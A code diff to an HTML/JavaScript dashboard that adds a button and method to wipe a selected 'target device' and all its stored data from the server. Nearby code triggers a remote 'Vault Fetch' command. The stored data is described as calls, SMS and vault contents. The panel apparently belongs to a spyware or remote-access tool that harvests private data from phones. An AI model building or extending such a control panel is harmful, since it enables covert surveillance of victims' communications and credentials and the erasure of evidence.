@@ -41,7 +41,7 @@
         ::-webkit-scrollbar { width: 4px; }
         ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
 
-        /* 🚀 NEW: Button Glow Effect */
+        /* Button Glow Effect */
         .glow-btn { box-shadow: 0 0 12px var(--accent-dim); border: 1px solid var(--accent); color: var(--bg-main); background: var(--accent); }
         .glow-btn:hover { box-shadow: 0 0 20px var(--accent); transform: translateY(-1px); }
     </style>
@@ -60,9 +60,14 @@
         <div class="flex gap-3 w-full md:w-auto items-center">
             <select id="device-select" class="flex-1 md:w-48 bg-[var(--bg-card)] text-[var(--text-main)] border border-[var(--border)] p-2 rounded outline-none font-bold text-sm"></select>
             
-            <!-- 🚀 NEW: MASTER VAULT SYNC BUTTON -->
+            <!-- MASTER VAULT SYNC BUTTON -->
             <button id="btn-sync-vault" onclick="engine.triggerVaultFetch()" class="flex items-center justify-center px-4 py-2 rounded font-black text-xs uppercase tracking-widest glow-btn transition-all duration-300">
                 <i data-lucide="cloud-download" class="w-4 h-4 mr-2" id="sync-icon"></i> <span id="sync-text">Fetch Vault</span>
+            </button>
+
+            <!-- 🚀 NEW: DEVICE WIPE BUTTON -->
+            <button onclick="engine.deleteCurrentDevice()" class="p-2 border border-[var(--danger)] rounded bg-[var(--danger)]/10 hover:bg-[var(--danger)] hover:text-white transition group" title="Wipe Device & Data">
+                <i data-lucide="trash-2" class="w-5 h-5 text-[var(--danger)] group-hover:text-white"></i>
             </button>
 
             <button onclick="engine.cycleTheme()" class="p-2 border border-[var(--border)] rounded bg-[var(--bg-card)] hover:bg-[var(--accent-dim)] transition">
@@ -238,7 +243,6 @@
                 this.addTerminalLog(`Theme protocol switched to: ${newTheme.toUpperCase()}`);
             }
 
-            // 🚀 NEW: VAULT SYNC TRIGGER LOGIC
             async triggerVaultFetch() {
                 if(!this.activeId) {
                     this.addTerminalLog("[ERROR] No active target device selected.");
@@ -249,7 +253,6 @@
                 const icon = document.getElementById('sync-icon');
                 const text = document.getElementById('sync-text');
                 
-                // Visual Button Update
                 btn.classList.add('opacity-70', 'cursor-not-allowed', 'pointer-events-none');
                 icon.setAttribute('data-lucide', 'loader-2');
                 icon.classList.add('animate-spin');
@@ -259,7 +262,6 @@
                 this.addTerminalLog(`> Initiating Universal Vault Fetch protocol for [${this.activeId.substring(0,6)}]...`);
 
                 try {
-                    // API Call to Python Backend
                     const response = await fetch(`/api/sync/commands/trigger?token=${this.activeId}`, {
                         method: 'POST',
                         headers: {
@@ -280,7 +282,6 @@
                     this.addTerminalLog(`> [CRITICAL] Network anomaly detected during dispatch.`);
                 }
 
-                // Reset Button after 4 seconds
                 setTimeout(() => {
                     btn.classList.remove('opacity-70', 'cursor-not-allowed', 'pointer-events-none');
                     icon.classList.remove('animate-spin');
@@ -288,6 +289,40 @@
                     text.innerText = 'FETCH VAULT';
                     lucide.createIcons();
                 }, 4000);
+            }
+
+            // 🚀 NEW: WIPE DEVICE LOGIC
+            async deleteCurrentDevice() {
+                if(!this.activeId) {
+                    this.addTerminalLog("[ERROR] No active target device selected for wiping.");
+                    return;
+                }
+                
+                // Reality check confirmation to avoid accidents
+                const confirmWipe = confirm("WARNING: This will permanently wipe the device and ALL its data (Calls, SMS, Vault) from the server. This action cannot be undone.\n\nProceed?");
+                if(!confirmWipe) return;
+
+                this.addTerminalLog(`> Executing Total Wipe protocol for Device ID: ${this.activeId.substring(0,8)}...`);
+
+                try {
+                    const res = await fetch(`/api/devices/${this.activeId}`, {
+                        method: 'DELETE',
+                        headers: { 'Authorization': `Bearer ${this.token}` }
+                    });
+                    const result = await res.json();
+
+                    if(result.status === 'success') {
+                        this.addTerminalLog("> [SUCCESS] Device and all ghost data eradicated.");
+                        localStorage.removeItem('active_device_id');
+                        this.activeId = null;
+                        
+                        setTimeout(() => { window.location.reload(); }, 1500);
+                    } else {
+                        this.addTerminalLog(`> [ERROR] Wipe failed: ${result.message}`);
+                    }
+                } catch(e) {
+                    this.addTerminalLog("> [CRITICAL] Connection lost during wipe protocol.");
+                }
             }
 
             async loadDevices() {
